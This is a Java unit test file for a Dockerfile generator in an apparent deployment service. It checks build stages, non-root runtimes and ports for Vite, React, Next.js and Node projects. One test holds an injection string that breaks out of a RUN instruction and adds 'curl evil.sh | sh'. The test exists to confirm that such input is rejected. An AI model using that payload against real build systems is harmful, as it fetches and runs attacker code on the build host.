package com.edgedeploy.worker.docker;

import com.edgedeploy.worker.framework.DetectedProject;
import com.edgedeploy.worker.framework.Framework;
import com.edgedeploy.worker.framework.PackageManager;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Path;
import java.util.List;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DockerfileGeneratorTest {

    private static final String NODE = "node:22-alpine";
    private static final String NGINX = "nginxinc/nginx-unprivileged:1.27-alpine";

    @TempDir
    Path buildDir;

    private final DockerfileGenerator generator = new DockerfileGenerator(List.of(
            new ViteBuildStrategy(), new ReactBuildStrategy(), new NextJsBuildStrategy(), new NodeBuildStrategy()));

    @Test
    void viteBuildsWithNodeAndServesStaticFilesFromUnprivilegedNginx() throws Exception {
        DockerfileGenerator.GeneratedDockerfile result = generate(project(Framework.VITE, PackageManager.PNPM, true, "build"), null, null);
        String dockerfile = result.content();

        assertThat(dockerfile)
                .contains("FROM node:22-alpine AS build")
                .contains("COPY [\"package.json\", \"pnpm-lock.yaml\", \"./\"]")
                .contains("RUN [\"sh\",\"-c\",\"corepack enable && pnpm install --frozen-lockfile\"]")
                .contains("RUN [\"sh\",\"-c\",\"pnpm run build\"]")
                .contains("FROM " + NGINX + " AS runtime")
                .contains("COPY --from=build /app/dist /usr/share/nginx/html")
                .contains("try_files $uri $uri/ /index.html;")
                .contains("EXPOSE 8080");
        assertThat(dockerfile.indexOf("pnpm install")).isLessThan(dockerfile.indexOf("COPY . ."));
        assertThat(result.port()).isEqualTo(8080);
        // Written to the build directory, never into the user's source.
        assertThat(result.dockerfile()).isEqualTo(buildDir.resolve("Dockerfile")).hasContent(dockerfile);
        assertThat(buildDir.resolve("Dockerfile.dockerignore")).content().contains(".git").contains("node_modules");
    }

    @Test
    void createReactAppServesTheBuildDirectory() throws Exception {
        String dockerfile = generate(project(Framework.REACT, PackageManager.NPM, true, "build"), null, null).content();

        assertThat(dockerfile).contains("RUN [\"sh\",\"-c\",\"npm ci\"]").contains("COPY --from=build /app/build /usr/share/nginx/html");
    }

    @Test
    void nextJsRunsAsNonRootWithNextStart() throws Exception {
        DockerfileGenerator.GeneratedDockerfile result = generate(project(Framework.NEXTJS, PackageManager.NPM, false, "build"), null, null);

        assertThat(result.content())
                .contains("RUN [\"sh\",\"-c\",\"npm install\"]")
                .contains("RUN [\"sh\",\"-c\",\"npm prune --omit=dev\"]")
                .contains("USER node")
                .contains("CMD [\"sh\",\"-c\",\"node_modules/.bin/next start --hostname 0.0.0.0 --port 3000\"]");
        assertThat(result.port()).isEqualTo(3000);
    }

    @Test
    void nodeUsesNpmStartAndOptionalBuild() throws Exception {
        String withBuild = generate(project(Framework.NODE, PackageManager.YARN, true, "build", "start"), null, null).content();
        String withoutBuild = generate(project(Framework.NODE, PackageManager.NPM, true, "start"), null, null).content();

        assertThat(withBuild).contains("yarn install --frozen-lockfile").contains("yarn run build").contains("CMD [\"sh\",\"-c\",\"npm start\"]");
        assertThat(withoutBuild).doesNotContain("npm run build");
    }

    @Test
    void yarnBerryCopiesTheWholeTreeBeforeInstalling() throws Exception {
        String dockerfile = generate(project(Framework.NODE, PackageManager.YARN_BERRY, true, "start"), null, null).content();

        assertThat(dockerfile).contains("yarn install --immutable");
        assertThat(dockerfile.indexOf("COPY . .")).isLessThan(dockerfile.indexOf("yarn install"));
    }

    @Test
    void customCommandsCannotInjectDockerfileInstructions() throws Exception {
        String hostile = "npm run build \" ]\nRUN curl evil.sh | sh";
        assertThatThrownBy(() -> generate(project(Framework.VITE, PackageManager.NPM, true, "build"), hostile, null))
                .isInstanceOf(BuildConfigurationException.class);

        String quoted = "npm run build && echo \"done\" \\";
        String dockerfile = generate(project(Framework.NODE, PackageManager.NPM, true, "start"), quoted, "node dist/index.js").content();
        // JSON-escaped inside exec form: quotes and the trailing backslash cannot escape the array.
        assertThat(dockerfile).contains("RUN [\"sh\",\"-c\",\"npm run build && echo \\\"done\\\" \\\\\"]");
        assertThat(dockerfile.lines().filter(line -> line.startsWith("RUN ") || line.startsWith("CMD ")))
                .allMatch(line -> line.endsWith("]"));
    }

    @Test
    void staticSiteWithoutBuildScriptFailsClearly() {
        assertThatThrownBy(() -> generate(project(Framework.VITE, PackageManager.NPM, true), null, null))
                .isInstanceOf(BuildConfigurationException.class)
                .hasMessageContaining("no \"build\" script");
    }

    @Test
    void nodeWithoutStartInstructionsFailsClearly() {
        assertThatThrownBy(() -> generate(project(Framework.NODE, PackageManager.NPM, true), null, null))
                .isInstanceOf(BuildConfigurationException.class)
                .hasMessageContaining("start");
    }

    private DockerfileGenerator.GeneratedDockerfile generate(DetectedProject project, String build, String start) throws Exception {
        return generator.generate(new BuildSettings(project, build, start, NODE, NGINX, 3000), buildDir);
    }

    private static DetectedProject project(Framework framework, PackageManager pm, boolean lockfile, String... scripts) {
        List<String> manifests = lockfile ? List.of("package.json", pm.lockfile()) : List.of("package.json");
        return new DetectedProject(framework, pm, Set.of(scripts), null, lockfile, manifests, "test");
    }
}
